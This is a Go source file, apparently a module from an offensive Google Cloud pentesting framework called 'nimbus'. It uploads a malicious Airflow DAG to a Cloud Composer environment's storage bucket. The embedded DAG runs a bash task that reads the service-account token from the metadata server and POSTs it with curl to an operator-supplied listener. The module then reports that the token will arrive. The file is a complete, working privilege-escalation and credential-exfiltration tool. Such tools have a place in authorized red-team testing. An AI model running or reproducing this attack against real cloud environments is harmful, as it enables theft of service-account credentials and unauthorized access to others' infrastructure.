package composer

import (
	"bytes"
	"context"
	"fmt"
	"strings"
	"time"

	gcs "cloud.google.com/go/storage"
	composer "google.golang.org/api/composer/v1"

	"github.com/user/nimbus/internal/module"
	"github.com/user/nimbus/internal/output"
)

func init() {
	module.Register(&EscalateDAG{})
}

// EscalateDAG uploads a malicious DAG to a Cloud Composer environment's GCS bucket.
type EscalateDAG struct{}

func (m *EscalateDAG) Info() module.Info {
	return module.Info{
		Name:         "privesc.composer.escalate-dag",
		Tactic:       module.TacticPrivesc,
		Service:      "composer",
		Description:  "Upload a malicious DAG to Cloud Composer to escalate via the environment's SA",
		RequiresAuth: true,
	}
}

// defaultDAGContent returns a Python DAG that exfiltrates the metadata token.
func defaultDAGContent(listener string) string {
	return fmt.Sprintf(`from airflow import DAG
from airflow.operators.bash import BashOperator
from datetime import datetime

default_args = {
    "owner": "airflow",
    "start_date": datetime(2024, 1, 1),
    "retries": 0,
}

with DAG(
    "nimbus_escalate",
    default_args=default_args,
    schedule_interval="@once",
    catchup=False,
) as dag:
    exfil = BashOperator(
        task_id="exfil_token",
        bash_command=(
            'TOKEN=$(curl -s -H "Metadata-Flavor: Google" '
            '"http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token") && '
            'curl -s -X POST -H "Content-Type: application/json" -d "$TOKEN" %s'
        ),
    )
`, listener)
}

func (m *EscalateDAG) Run(ctx module.RunContext) error {
	environment := ctx.Flags["environment"]
	region := ctx.Flags["region"]
	dagContent := ctx.Flags["dag-content"]
	listener := ctx.Flags["listener"]

	if environment == "" {
		output.Warn("Usage: run privesc.composer.escalate-dag --environment <name> [--region <region>] [--listener <url>] [--dag-content <python>]")
		output.Info("Uploads a malicious DAG to the Composer environment's GCS bucket.")
		return nil
	}

	if region == "" {
		region = "us-central1"
	}

	if dagContent == "" {
		if listener == "" {
			output.Warn("Provide --listener <url> or --dag-content <python>")
			return nil
		}
		dagContent = defaultDAGContent(listener)
	}

	projects := module.EnsureProjects(&ctx)
	if len(projects) == 0 {
		output.Warn("No project specified.")
		return nil
	}
	project := projects[0]

	// Get the environment details to find the DAG GCS prefix.
	composerSvc, err := composer.NewService(context.Background(), ctx.Session.ClientOption())
	if err != nil {
		return fmt.Errorf("create composer client: %w", err)
	}

	envName := fmt.Sprintf("projects/%s/locations/%s/environments/%s", project, region, environment)
	output.Info("Fetching environment details: %s", envName)

	env, err := composerSvc.Projects.Locations.Environments.Get(envName).Do()
	if err != nil {
		return fmt.Errorf("get environment: %w", err)
	}

	dagGcsPrefix := env.Config.DagGcsPrefix
	if dagGcsPrefix == "" {
		return fmt.Errorf("environment %s has no dagGcsPrefix configured", environment)
	}

	output.Info("DAG GCS prefix: %s", dagGcsPrefix)

	// Parse the GCS bucket and path from the prefix (gs://bucket/path).
	if !strings.HasPrefix(dagGcsPrefix, "gs://") {
		return fmt.Errorf("unexpected dagGcsPrefix format: %s", dagGcsPrefix)
	}
	trimmed := strings.TrimPrefix(dagGcsPrefix, "gs://")
	parts := strings.SplitN(trimmed, "/", 2)
	bucketName := parts[0]
	dagPath := ""
	if len(parts) > 1 {
		dagPath = parts[1]
	}

	// Upload the malicious DAG.
	timestamp := time.Now().UTC().Format("20060102_150405")
	dagFileName := fmt.Sprintf("nimbus_escalate_%s.py", timestamp)
	objectName := dagFileName
	if dagPath != "" {
		objectName = fmt.Sprintf("%s/%s", strings.TrimRight(dagPath, "/"), dagFileName)
	}

	gcsClient, err := gcs.NewClient(context.Background(), ctx.Session.ClientOption())
	if err != nil {
		return fmt.Errorf("create storage client: %w", err)
	}
	defer gcsClient.Close()

	output.Info("Uploading DAG to gs://%s/%s", bucketName, objectName)

	writer := gcsClient.Bucket(bucketName).Object(objectName).NewWriter(context.Background())
	writer.ContentType = "text/x-python"

	if _, err := bytes.NewBufferString(dagContent).WriteTo(writer); err != nil {
		writer.Close()
		return fmt.Errorf("write DAG: %w", err)
	}
	if err := writer.Close(); err != nil {
		return fmt.Errorf("close DAG writer: %w", err)
	}

	output.Success("Malicious DAG uploaded to gs://%s/%s", bucketName, objectName)
	output.Info("The DAG will be picked up by Airflow automatically. Monitor your listener for the token.")

	if ctx.Findings != nil {
		ctx.Findings <- module.Finding{
			Module:      "privesc.composer.escalate-dag",
			Severity:    module.SevCritical,
			Title:       "Malicious DAG uploaded to Cloud Composer",
			Description: fmt.Sprintf("Uploaded DAG %s to environment %s (gs://%s/%s) to exfiltrate the environment SA token", dagFileName, environment, bucketName, objectName),
			Resource:    environment,
			Project:     project,
		}
	}

	return nil
}
